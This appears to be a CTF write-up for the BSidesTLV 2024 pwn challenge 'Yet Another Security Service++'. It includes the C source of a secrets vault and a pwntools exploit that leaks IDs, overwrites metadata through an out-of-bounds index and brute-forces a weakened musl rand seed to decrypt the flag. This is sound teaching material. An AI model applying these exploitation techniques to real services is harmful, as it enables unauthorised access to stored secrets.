# Yet Another Security Service++

 * Category: Pwn
 * 300 Points
 * Solved by the JCTF Team

## Description

> Welcome to our new security services! You can trust us to keep your secrets safely on our online vault.

<details>
  <summary>Click to expand source code</summary>

Contents of `challenge.h`:

```c
#include <stddef.h>
#include <stdint.h>

#define SECRET_DATA_LEN 100
#define SECRET_ID_LEN 20
#define MAX_SECRETS 50
#define RES_MSG_LEN 150

#define PACKED __attribute__((__packed__))

#define ERROR -1
#define SUCCESS 0

struct PACKED meta
{
	uint8_t is_valid;
	uint8_t is_encrypted;
	uint64_t seed;
};

struct PACKED secret
{
	uint8_t secret_id[SECRET_ID_LEN];
	uint32_t reserved;
	uint8_t secret_data[SECRET_DATA_LEN];
};

struct PACKED context_t
{
	char reserved[10]; // meta meta data :) we'll maybe use that later
	struct meta meta_data[MAX_SECRETS];
	struct secret secret_list[MAX_SECRETS];
};

struct PACKED request
{
	uint8_t cmd;
	uint8_t secret_id[SECRET_ID_LEN];
};

struct PACKED request_params
{
	uint8_t is_encrypted;
	uint8_t secret_data[SECRET_DATA_LEN];
};

struct PACKED response
{
	char msg[RES_MSG_LEN];
};

enum commands
{
	SET_SECRET,
	UNSET_SECRET,
	GET_SECRET,
};

void server_main();

```

Contents of `challenge.c`:

```c
// in this challenge we use the musl implementation of libc
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include "challenge.h"

struct context_t context = {0};

// thanks chatgpt - that's probably fine :)
uint64_t get_rand_qword(void) {
	uint64_t random_byte;
	int random_fd = open("/dev/random", O_RDONLY);

	if (random_fd < 0) {
		perror("failed to open /dev/random");
		exit(1);
	}

	ssize_t bytes_read = read(random_fd, &random_byte, sizeof(random_byte));
	if (bytes_read < 0) {
		perror("failed to read /dev/random");
		close(random_fd);
		exit(1);
	}

	close(random_fd);
	return random_byte;
}

static int get_secret_index_from_list(uint8_t * secret_id)
{
	for (int i = 0; i < MAX_SECRETS; i++)
	{
		if (context.meta_data[i].is_valid == 0)
			continue;
		if (memcmp(context.secret_list[i].secret_id,
			   secret_id,
			   SECRET_ID_LEN) == 0)
			return i;
	}
	return ERROR;
}

static int get_free_secret_index()
{
	for (int i = 0; i < MAX_SECRETS; i++)
	{
		if(context.meta_data[i].is_valid == 0)
			return i;
	}
	return ERROR;
}

// if the given secret is encrypted then decrypt it
// if it's decrypted then encrypt it
static void encrypt_decrypt(int secret_id)
{
	srand(context.meta_data[secret_id].seed);
	for (int i = 0; i < SECRET_DATA_LEN; i++)
	{
		context.secret_list[secret_id].secret_data[i] ^= rand();
	}
	context.meta_data[secret_id].is_encrypted ^= 1;
}

// if the given secret exist in the database then override it,
// else, create a new secret in the database
static void set_secret(uint8_t* secret_id, uint8_t is_encrypted, uint8_t* secret_data,
		       struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);
	int secret_len = 0;

	if (idx == ERROR)
	{
		idx = get_free_secret_index();
	}

	// copy secret_id (bytes)
	memcpy(context.secret_list[idx].secret_id, secret_id, SECRET_ID_LEN);

	// copy secret content (string)
	secret_len = strnlen((char *)secret_data, SECRET_DATA_LEN);
	memcpy((char *)context.secret_list[idx].secret_data,
		(char *)secret_data,
		secret_len);
	if (secret_len < SECRET_DATA_LEN)
		context.secret_list[idx].secret_data[secret_len] = '\0';

	// mark entry as valid
	context.meta_data[idx].is_valid = 1;
	context.meta_data[idx].is_encrypted = 0;
	context.meta_data[idx].seed = get_rand_qword();
	// zero one byte from the seed as hardening so if someone manage to
	// print it, they won't get all of it
	context.meta_data[idx].seed &= 0xffffffff00ffffff;

	// encrypt if requested
	if(is_encrypted)
	{
		encrypt_decrypt(idx);
	}
	snprintf(res->msg, RES_MSG_LEN, "[+] done! don't forget your secret_id!");
}

static void get_secret(uint8_t* secret_id, struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);

	if (idx == ERROR || context.meta_data[idx].is_valid == 0)
	{
		snprintf(res->msg, RES_MSG_LEN, "[-] can't get secret, invalid secret_id");
		return;
	}

	if(!context.meta_data[idx].is_encrypted)
	{
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
	}
	else
	{
		encrypt_decrypt(idx); //decrypt
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
		encrypt_decrypt(idx); // encrypt
	}
}

static void unset_secret(uint8_t* secret_id, struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);

	if (idx == ERROR)
	{
		snprintf(res->msg, RES_MSG_LEN, "[-] can't unset secret, invalid secret_id");
		return;
	}

	context.meta_data[idx].is_valid = 0;
	context.meta_data[idx].is_encrypted = 0;
	context.meta_data[idx].seed = 0;
	memset(context.secret_list[idx].secret_id, 0, SECRET_ID_LEN);
	memset(context.secret_list[idx].secret_data, 0, SECRET_DATA_LEN);
	snprintf(res->msg, RES_MSG_LEN, "[+] done");
}

void process_request(struct request* req, struct request_params* req_params,
		     struct response * res)
{
	switch(req->cmd)
	{
		case GET_SECRET:
			get_secret(req->secret_id, res);
			break;
		case SET_SECRET:
			set_secret(req->secret_id, req_params->is_encrypted,
				   req_params->secret_data, res);
			break;
		case UNSET_SECRET:
			unset_secret(req->secret_id, res);
			break;
		default:
			snprintf(res->msg, RES_MSG_LEN, "[-] invalid command");
			break;
	}
}

size_t read_buffer(void* buffer, size_t size) {
	size_t nread = fread(buffer, 1, size, stdin);
	if (nread < size && nread > 0) {
		fprintf(stderr, "Bad readsize: %zu (connection dropped)\n", nread);
		return 0;
	}
	return nread;
}

void server_main()
{
	while(1)
	{
		struct request req = {0};
		struct request_params req_params = {0};
		struct response res = {0};

		printf(">> ");
		if (!read_buffer(&req, sizeof(req))) {
			break;
		}
		if (req.cmd == SET_SECRET) {
			if (!read_buffer(&req_params, sizeof(req_params)))
				break;
		}

		process_request(&req, &req_params, &res);
		puts(res.msg);
	}
}

```

</details>


## Solution

The attached program implements a *Secrets Service*, allowing users to store and read back
secrets based on a *Secret ID*. This is the third and last challenge from a series of challenges 
which share the same source code.

Quick reminder: In the previous challenge we found a few vulnerabilities: 
 * We can leak Secret IDs of existing entries by exploiting incorrect NULL-termination logic: 
   If we set a secret with `SECRET_DATA_LEN` characters and then read it back, the Secret ID 
   of the subsequent secret gets leaked as well due to the lack of a NULL-terminator between them.
 * We can (partially or fully) overwrite the metadata for some entries
 * While the random seed used to encrypt/decrypt the secrets is of type `uint64_t`, only
   the lower DWORD is used in practice

As before, we start by trying to leak the existing Secret IDs:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service++]
└─$ python3 exploit2.py
[+] Opening connection to 0.cloud.chals.io on port 11953: Done
[*] Leaked ID: 'flag is not here' at entry 17
[*] Leaked ID: 'flag is not here' at entry 39
[*] Leaked ID: 'enc' at entry 42
Traceback (most recent call last):
  File "/media/sf_CTFs/bsides/Yet_Another_Security_Service++/exploit2.py", line 152, in <module>
    secret = get_secret(b"enc")
             ^^^^^^^^^^^^^^^^^^
  File "/media/sf_CTFs/bsides/Yet_Another_Security_Service++/exploit2.py", line 132, in get_secret
    raise RuntimeError(f"Can't read secret {secret_id}")
RuntimeError: Can't read secret b'enc'
[*] Closed connection to 0.cloud.chals.io port 11953
```

We have a new secret called "enc", but we can't access it. We can guess that it's encrypted
according to the name. To extract it, let's use the Secret ID override exploit we found
in the previous challenge:

 1. Fill the array with entries to trigger the `idx = -1` exploit, allowing us to override metadata
 2. Overwrite `enc`'s metadata and set in as invalid
 3. Write a new secret with a known ID and with `data = '\0'` (so that the original data is unchanged).
 4. Overwrite `enc`'s metadata and set in as valid
 5. Read the new secret ID to get the original "enc" data

```python

	# ... Fill the secret array first ...

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],              # Last 4 bytes of meta_data[37].seed
        MetaData(0x1, 0x0, 0x0).to_bytes(),                  # meta_data[38]: Valid,   Unencrypted, seed = 0
        MetaData(0x0, 0x0, 0x0).to_bytes()[:6]               # meta_data[39]: Invalid, Unencrypted, seed LSB = 0
    ])
    secret_data = MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 2 \
                + MetaData(0x0, 0xf, 0xffffffffffffffff).to_bytes()     \ 
                + MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 7
    set_secret(secret_id, False, secret_data)

    secret_id_replacement = b'SECRETID_REPLACEMENT'

    # Write "SECRETID_REPLACEMENT" to secret_list[42].secret_id, overwriting "enc"
    # secret_list[42].secret_data is unchanged
    set_secret(secret_id_replacement, False, b"\x00" * 100)

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],               # Last 4 bytes of meta_data[37].seed
        MetaData(0x1, 0x0, 0x0).to_bytes(),                   # meta_data[38]: Valid, Unencrypted, seed = 0
        MetaData(0x1, 0x0, 0x0).to_bytes()[:6]                # meta_data[39]: Valid, Unencrypted, seed LSB = 0
    ])
    secret_data = MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 2 \
                + MetaData(0x1, 0x0, 0xffffffffffffffff).to_bytes()     \
                + MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 7
    set_secret(secret_id, False, secret_data)

    secret = get_secret(secret_id_replacement)
    if (len(secret) == 0):
        log.info(f"Got empty secret")
    else:
        log.info(f"Got secret:\n{hexdump(secret)}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service++]
└─$ python3 exploit2.py
[+] Opening connection to 0.cloud.chals.io on port 11953: Done
[*] Leaked ID: 'flag is not here' at entry 17
[*] Leaked ID: 'flag is not here' at entry 39
[*] Leaked ID: 'enc' at entry 42
[*] Got empty secret
[*] Closed connection to 0.cloud.chals.io port 11953
```

We got an empty result. Maybe the encrypted data starts with a NULL byte as well. So, as 
before, we modify our solution to utilize the encryption feature to avoid NULL bytes:

 1. Fill the array with entries to trigger the `idx = -1` exploit, allowing us to override metadata
 2. Overwrite `enc`'s metadata and set in as invalid
 3. Write a new secret with a known ID and with `data = '\0'` (so that the original data is unchanged).
 4. Overwrite `enc`'s metadata and set in as valid and encrypted with our own seed
 5. Read the new secret ID and get the original secret data (encrypted a second time with our own new seed)

```python

	# ... Fill the secret array first ...

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],              # Last 4 bytes of meta_data[37].seed (doesn't matter)
		MetaData(0x1, 0x1, 0x0).to_bytes(),                  # meta_data[38]: Valid, Unencrypted, seed = 0 (doesn't matter)
		MetaData(0x1, 0x0, 0x0).to_bytes()[:6]               # meta_data[39]: Valid, Unencrypted, seed prefix = 0 (doesn't matter)
    ])
    
    # Note: memcpy will stop copying after the 0x0 due to strnlen usage
    secret_data = MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 2 \
                + MetaData(0x0, 0xf, 0xffffffffffffffff).to_bytes()     \
                + MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 7

    print(f"Overriding meta_data[40:50] with:\n{hexdump(secret_data, width = 10, skip = False)}")
    set_secret(secret_id, False, secret_data)

    secret_id_replacement = b'SECRETID_REPLACEMENT'

    # Write "SECRETID_REPLACEMENT" to secret_list[42].secret_id, overwriting "enc"
    # secret_list[42].secret_data is unchanged
    set_secret(secret_id_replacement, False, b"\x00" * 100)

    secret = get_secret(secret_id_replacement)
    log.info(f"Got secret:\n{hexdump(secret)}")

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],              # Last 4 bytes of meta_data[37].seed (doesn't matter)
		MetaData(0x1, 0x1, 0x0).to_bytes(),                  # meta_data[38]: Valid, Unencrypted, seed = 0 (doesn't matter)
		MetaData(0x1, 0x0, 0x0).to_bytes()[:6]               # meta_data[39]: Valid, Unencrypted, seed prefix = 0 (doesn't matter)
    ])

    secret_data = MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 2 \
                + MetaData(0x1, 0x1, 0xFFFFFFFF03030303).to_bytes()            \
                + MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 7
    print(f"Overriding meta_data[40:50] with:\n{hexdump(secret_data, width = 10, skip = False)}")
    set_secret(secret_id, False, secret_data)

    secret = get_secret(secret_id_replacement)
    log.info(f"Got secret:\n{hexdump(secret)}")
```

Output: 

```console
[*] Setting secret b'\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00' data to: bytearray(b'\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x00\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff')
[*] Setting secret b'SECRETID_REPLACEMENT' data to: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Getting secret b'SECRETID_REPLACEMENT' data
[*] Got secret:
    00000000
Overriding meta_data[40:50] with:
00000000  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
0000000a  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
00000014  01 01 03 03  03 03 ff ff  ff ff  │····│····│··│
0000001e  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
00000028  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
00000032  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
0000003c  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
00000046  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
00000050  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
0000005a  01 0f ff ff  ff ff ff ff  ff ff  │····│····│··│
00000064
[*] Setting secret b'\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00' data to: bytearray(b'\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x01\x03\x03\x03\x03\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff\x01\x0f\xff\xff\xff\xff\xff\xff\xff\xff')
[*] Getting secret b'SECRETID_REPLACEMENT' data
[*] Got secret:
    00000000  3f cf b0 51  14 71 32 c2  19 67 05 30  f4 94 ed 95  │?··Q│·q2·│·g·0│····│
    00000010  55 98 2d df  f8 0e da 4c  79 7a da 22  c0 d2 23 8d  │U·-·│···L│yz·"│··#·│
    00000020  52 db ab 5e  d3 57 2f c7  ec df cd d7  14 dc d1 25  │R··^│·W/·│····│···%│
    00000030  13 65 b0 bd  9f 5a 4e c5  ce 43 61 dc  45 2b 7f a4  │·e··│·ZN·│·Ca·│E+··│
    00000040  d0 25 fd 17  87 bd 0f 3c  e9 84 f8 77  e1 53 88 05  │·%··│···<│···w│·S··│
    00000050  34 06 35 37  34 9c 7d 59  28 26 b9 4c  10 74 c6 0f  │4·57│4·}Y│(&·L│·t··│
    00000060  18 cd 6a 1a  73 34 33                               │··j·│s43│
    00000067
```

Great, we leaked `enc`'s secret data, but it's encrypted not once, but twice! Sure, the outer
level is encrypted with a key based on our own seed (we used `0x03030303`), so that should
be easy to decrypt, but even after we decrypt the outer later, we're stuck with the inner-layer
encryption, and we don't have the seed for that!

To our rescue comes one last flaw in the program:

```c
	// zero one byte from the seed as hardening so if someone manage to
	// print it, they won't get all of it
	context.meta_data[idx].seed &= 0xffffffff00ffffff;
```

This operation, done as part of `set_secret`, actually reduces the seed entropy from 4 bytes
($2^{32}$) to 3 bytes ($2^{24}$), by zeroing the most significant byte. This makes brute-forcing
the seed much easier, assuming we can find the right LIBC that matches the one used on the
server. We try all possible seeds until we find one that decrypts the content to text
containing the flag format.

After searching for a while, we found [this implementation](https://git.musl-libc.org/cgit/musl/tree/src/prng/rand.c)
that gives us the same key that we calculated ourselves in the previous challenge. So, from 
here, it's just a matter of brute force:

```c
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#define TRUE 1
#define FALSE 0

#define PHASE1_SEED     0x03030303
#define MAX_PHASE2_SEED 0xffffff

static uint64_t seed;

void srand_musl(unsigned s)
{
    seed = s-1;
}

int rand_musl(void)
{
    seed = 6364136223846793005ULL*seed + 1;
    return seed>>33;
}

char secret[] = {
    0x3f, 0xcf, 0xb0, 0x51, 0x14, 0x71, 0x32, 0xc2,
    0x19, 0x67, 0x05, 0x30, 0xf4, 0x94, 0xed, 0x95,
    0x55, 0x98, 0x2d, 0xdf, 0xf8, 0x0e, 0xda, 0x4c,
    0x79, 0x7a, 0xda, 0x22, 0xc0, 0xd2, 0x23, 0x8d,
    0x52, 0xdb, 0xab, 0x5e, 0xd3, 0x57, 0x2f, 0xc7,
    0xec, 0xdf, 0xcd, 0xd7, 0x14, 0xdc, 0xd1, 0x25,
    0x13, 0x65, 0xb0, 0xbd, 0x9f, 0x5a, 0x4e, 0xc5,
    0xce, 0x43, 0x61, 0xdc, 0x45, 0x2b, 0x7f, 0xa4,
    0xd0, 0x25, 0xfd, 0x17, 0x87, 0xbd, 0x0f, 0x3c,
    0xe9, 0x84, 0xf8, 0x77, 0xe1, 0x53, 0x88, 0x05,
    0x34, 0x06, 0x35, 0x37, 0x34, 0x9c, 0x7d, 0x59,
    0x28, 0x26, 0xb9, 0x4c, 0x10, 0x74, 0xc6, 0x0f,
    0x18, 0xcd, 0x6a, 0x1a, 0x73, 0x34, 0x33
};

char work_buf[sizeof(secret) + 1] = {0};


static void encrypt_decrypt(unsigned int seed, char* src, char* dst, size_t size)
{
    srand_musl(seed);
    for (int i = 0; i < size; ++i)
    {
        dst[i] = src[i] ^ rand_musl();

    }
}

static bool search_for_flag(const char* flag_format)
{
    for (int i = 0; i < sizeof(work_buf); ++i)
    {
        if (work_buf[i] == '\0')
        {
            work_buf[i] = ' ';
        }
    }
        
    return (strstr(work_buf, flag_format) != NULL);
}


int main(int argc, char*[] argv)
{
    int seed;

    encrypt_decrypt(PHASE1_SEED, secret, secret, sizeof(secret));

    for (seed = 0; seed <= MAX_PHASE2_SEED; ++seed)
    {
        encrypt_decrypt(seed, secret, work_buf, sizeof(secret));
        if (search_for_flag("BSidesTLV"))
        {
            printf("Seed: 0x%x\n", seed);
            printf("String: %s\n", work_buf);
            break;
        }
    }
    
	return 0;
}
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service++]
└─$ gcc bf_seed.c -o bf_seed && ./bf_seed
Seed: 0x11e05e
String: �         BSidesTLV2024{r4nD_1S_nO7_ranD0m_bd2ace332107efca20d5}                                    �Z   ��jkpn�:
```

The full Python script:

```python
# First, generate a pwntools template using:
# $ pwn template --host 0.cloud.chals.io --port 11953

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import re

from enum import Enum
from ctypes import *
from ctypes import CDLL

SECRET_DATA_LEN = 100
SECRET_ID_LEN   = 20
MAX_SECRETS     = 50

class Commands(Enum):
	SET_SECRET = 0
	UNSET_SECRET = 1
	GET_SECRET = 2

class Request(Structure):
    _pack_ = 1
    _fields_ = [
        ('cmd',       c_uint8),
        ('secret_id', c_uint8 * SECRET_ID_LEN)
    ]

class RequestParams(Structure):
    _pack_ = 1
    _fields_ = [
        ('is_encrypted', c_uint8),
        ('secret_data',  c_uint8 * SECRET_DATA_LEN)
    ]

class MetaData(Structure):
    _pack_ = 1
    _fields_ = [
        ('is_valid',      c_uint8),
        ('is_encrypted',  c_uint8),
        ('seed',          c_uint64)
    ]

    def to_bytes(self):
        return bytearray(self)

io = start()

def send_command(command):
    io.send(command)
    io.recvuntil(b">> ")
    return io.recvline(keepends=False)

def set_secret(secret_id, is_encrypted, secret_data):
    if len(secret_id) > SECRET_ID_LEN:
        raise ValueError("Secret ID Length too long")
    if len(secret_data) > SECRET_DATA_LEN:
        raise ValueError("Secret Data Length too long")
    
    encryption = ""
    if is_encrypted:
        encryption = "and encrypting "
    log.info(f"Setting {encryption}secret {secret_id} data to: {secret_data}")

    request = Request(Commands.SET_SECRET.value, 
                      (c_ubyte * SECRET_ID_LEN)(*secret_id, 
                                                *([0] * (SECRET_ID_LEN - len(secret_id)))))
    
    request_data = RequestParams(int(is_encrypted), 
                           (c_ubyte * SECRET_DATA_LEN)(*secret_data, 
                                                       *([0] * (SECRET_DATA_LEN - len(secret_data)))))
    res = send_command(bytearray(request) + bytearray(request_data))
    if res != b"[+] done! don't forget your secret_id!":
        raise RuntimeError(res)

def get_secret(secret_id):
    if len(secret_id) > SECRET_ID_LEN:
        raise ValueError("Secret ID Length too long")
    
    log.info(f"Getting secret {secret_id} data")

    request = Request(Commands.GET_SECRET.value, 
                      (c_ubyte * SECRET_ID_LEN)(*secret_id, 
                                                *([0] * (SECRET_ID_LEN - len(secret_id)))))
    
    res = send_command(bytearray(request))
    if res == b"[-] can't get secret, invalid secret_id":
        raise RuntimeError(f"Can't read secret {secret_id}")
    return res

# https://stackoverflow.com/questions/53808694/
def to_c_array(values, ctype="float", name="table", formatter=str, colcount=8):
    # apply formatting to each element
    values = [formatter(v) for v in values]

    # split into rows with up to `colcount` elements per row
    rows = [values[i:i+colcount] for i in range(0, len(values), colcount)]

    # separate elements with commas, separate rows with newlines
    body = ',\n    '.join([', '.join(r) for r in rows])

    # assemble components into the complete string
    return '{} {}[] = {{\n    {}\n}};'.format(ctype, name, body)
    
if __name__ == "__main__":
    secret_data_filler = b'.' * SECRET_DATA_LEN
    i = 0
    while i < MAX_SECRETS:
        secret_id = f"s{i}"
        set_secret(secret_id.encode(), False, secret_data_filler)
        try:
            secret = get_secret(secret_id.encode()).decode("ascii")
            log.info(f"Secret #{secret_id} read back: {secret}")
            if len(secret) != len(secret_data_filler):
                leaked_id = secret[len(secret_data_filler):]
                log.info(f"Leaked ID: '{leaked_id}' at entry {i + 1}")
                i += 1
        except RuntimeError:
            log.error(f"Failed to read secret #{i}")
        i += 1
            

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],              # Last 4 bytes of meta_data[37].seed (doesn't matter)
		MetaData(0x1, 0x1, 0x0).to_bytes(),                  # meta_data[38]: Valid, Unencrypted, seed = 0 (doesn't matter)
		MetaData(0x1, 0x0, 0x0).to_bytes()[:6]               # meta_data[39]: Valid, Unencrypted, seed prefix = 0 (doesn't matter)
    ])
    
    # Note: memcpy will stop copying after the 0x0 due to strnlen usage
    secret_data = MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 2 \
                + MetaData(0x0, 0xf, 0xffffffffffffffff).to_bytes()     \
                + MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 7

    print(f"Overriding meta_data[40:50] with:\n{hexdump(secret_data, width = 10, skip = False)}")
    set_secret(secret_id, False, secret_data)

    secret_id_replacement = b'SECRETID_REPLACEMENT'

    # Write "SECRETID_REPLACEMENT" to secret_list[42].secret_id, overwriting "enc"
    # secret_list[42].secret_data is unchanged
    set_secret(secret_id_replacement, False, b"\x00" * 100)

    secret = get_secret(secret_id_replacement)
    log.info(f"Got secret:\n{hexdump(secret)}")

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],              # Last 4 bytes of meta_data[37].seed (doesn't matter)
		MetaData(0x1, 0x1, 0x0).to_bytes(),                  # meta_data[38]: Valid, Unencrypted, seed = 0 (doesn't matter)
		MetaData(0x1, 0x0, 0x0).to_bytes()[:6]               # meta_data[39]: Valid, Unencrypted, seed prefix = 0 (doesn't matter)
    ])

    phase1_seed = 0xFFFFFFFF03030303
    secret_data = MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 2 \
                + MetaData(0x1, 0x1, phase1_seed).to_bytes()            \
                + MetaData(0x1, 0xf, 0xffffffffffffffff).to_bytes() * 7
    print(f"Overriding meta_data[40:50] with:\n{hexdump(secret_data, width = 10, skip = False)}")
    set_secret(secret_id, False, secret_data)

    secret = get_secret(secret_id_replacement)
    log.info(f"Got secret:\n{hexdump(secret)}")

    log.info(f'Extracted secret formatted as a C array:\n{to_c_array(secret, "char", "secret", lambda x: f"0x{x:02x}")}')

    if args.LOCAL_BF:
        libc = CDLL("/home/user/utils/pwn/libc-database/db/musl-1.2.5-r0.so")
        libc.srand(phase1_seed & 0xFFFFFFFF)
        secret_phase1 = xor(secret, [(libc.rand() & 0xff) for _ in range(len(secret))])
        log.info(f"Secret after first decryption:\n{hexdump(secret_phase1)}")

        max_seed_value = 0xffffff
        with log.progress('Searching for correct seed for decryption...') as p:
            for seed in range(max_seed_value + 1):
                p.status(f"Testing with seed {seed}")
                libc.srand(seed)
                decrypted = xor(secret_phase1, [(libc.rand() & 0xff) for _ in range(len(secret_phase1))])
                if b"BSidesTLV" in decrypted:
                    log.success(f"Seed: {seed}, Secret: {decrypted}")
                    break
    else:
        log.info("Please proceed to decrypt secret with a C program")
```

The flag: `BSidesTLV2024{r4nD_1S_nO7_ranD0m_bd2ace332107efca20d5}`